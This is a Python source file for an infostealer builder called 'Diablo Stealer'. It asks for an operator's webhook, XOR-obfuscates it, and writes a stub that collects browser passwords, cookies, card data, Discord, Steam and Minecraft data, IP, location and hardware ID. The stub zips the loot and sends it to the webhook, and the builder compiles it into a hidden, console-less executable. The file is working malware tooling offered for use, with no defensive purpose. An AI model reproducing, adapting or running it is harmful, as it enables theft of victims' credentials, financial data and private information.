from core.prompt import RavePrompt as prompt , Colors , Patterns
import uuid , base64 , subprocess , os

__version__ = '1.0.0'
__author__ = 'Ac2ro'



ORANGE = Colors.ORANGE
GRAY = Colors.GRAY
END = Colors.END

BUILD_PATH_DEFAULT = './builds'


__stub__ = r'''import base64 , hashlib

from modules.browsers.gecko import Gecko
from modules.discord import Discord
from modules.steam import Steam
from modules.minecraft import Minecraft
from modules.network import Network
from modules.system import System
from utils.vault import Vault , V_PATH

from os.path import join as join_path



def XOR(key : str , content : str):

    output = ''

    for index in range(len(content)):

        char = content[index]

        output += chr(ord(char) ^ ord(key[index % len(key)]))

    return output



class DiabloWebHookConfig:

    

    def __init__(self , wh , key) -> None:
        
        self.webhook = XOR(base64.b64decode(key).decode() , wh) #DE/XOR

    def __str__(self) -> str:
        
        return self.webhook
    

KEY    =    '%KEY%' # encoded key
WH     =    '%WH%' # encrypted webhook


webhook_CONFIG = DiabloWebHookConfig (
    WH.decode(),
    KEY
)

webhook =   str(webhook_CONFIG)

Vault.init()

Gecko.exfil(join_path(V_PATH , 'Browser Data'))

Discord.exfil(join_path(V_PATH , 'Discord'))

Minecraft.exfil(join_path(V_PATH , 'Minecraft'))

Steam.exfil(join_path(V_PATH , 'Steam'))

ip , loc , cnt , city = Network.exfil(join_path(V_PATH , 'Network'))

hwid = System.exfil(join_path(V_PATH , 'System'))


Vault.zip_vault()

Vault.send_full_vault_with_data(webhook , {
    'hwid' : hwid,
    'ip' : ip,
    'loc' : loc,
    'country' : cnt,
    'city' : city
})

'''


def XOR(key : str , content : str):

    output = ''

    for index in range(len(content)):

        char = content[index]

        output += chr(ord(char) ^ ord(key[index % len(key)]))

    return output

class Diablo:

    options = { }


def safe_ask_for_name():

    name = prompt.ask('Stub Name')

    return name

def safe_ask_for_webhook():


    webhook = prompt.ask_advanced('Webhook', Patterns.WEBHOOK)

  

    if prompt.check_if_webhook_alive(webhook):

        prompt.print_plus(f'Webhook Is {Colors.RED}Alive.{Colors.END}')

        return webhook

    else:

        prompt.print_min('Invalid Webhook , Try Again.')

        return safe_ask_for_webhook()



def diablo_prompt():

    prompt.clear()

    prompt.set_title('Diablo Builder')

    prompt.sexy_logo()

    prompt.print_seperator()

    prompt.vert('Diablo Stealer',Version=__version__ , Author=__author__ , Builds=BUILD_PATH_DEFAULT)


    prompt.print_seperator()


    name = safe_ask_for_name()

    webhook = safe_ask_for_webhook()


    Diablo.options['name'] = name

    Diablo.options['webhook'] = webhook


    prompt.print_seperator()


    prompt.vert('Diablo Stub Build Options' , Stub = f'{Diablo.options["name"]} (.exe)')

    prompt.print_seperator()

    prompt.vert('Diablo Stealer Modules Status' , Passwords='Yes',Cookies='Yes',CCs='Yes',Autofills='Yes',History='Yes',Discord = 'Yes',System='Yes',Ip='Yes',Mac='Yes',Hwid='Yes',Location='Yes', Minecraft='Yes' , Steam='Yes' , Roblox='Yes' , Twitter='Yes',Instagram = 'Yes',Reddit='Yes', Tiktok = 'Yes' , Browser = 'Yes' , Wifi='Yes' , Webcam='Yes' , Screenshot='Yes',Encryption='Yes')

    prompt.print_diablo('These are the stealing modules diablo offers.')

    prompt.print_seperator()

    prompt.print_imp('Building Stub...')

    key = uuid.uuid4().hex[0:10]

    enc_hook = XOR(key , webhook)

    src = __stub__.replace('%KEY%' , base64.b64encode(key.encode('utf8')).decode('utf8')).replace('\'%WH%\'' , str(enc_hook.encode()))

    src_path = f'./core/src/{name}.py'
    src_file = open(src_path , 'a')

    src_file.write(src)

    prompt.print_imp('Source File Written!')

    prompt.print_imp('Compiling Stub ...')

    subprocess.run([
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--clean',
            '--distpath', './builds',
            os.path.abspath(src_path)
        ], shell=True, check=True)
    prompt.print_mult('Compilation Done. Saved to ./builds .')


diablo_prompt()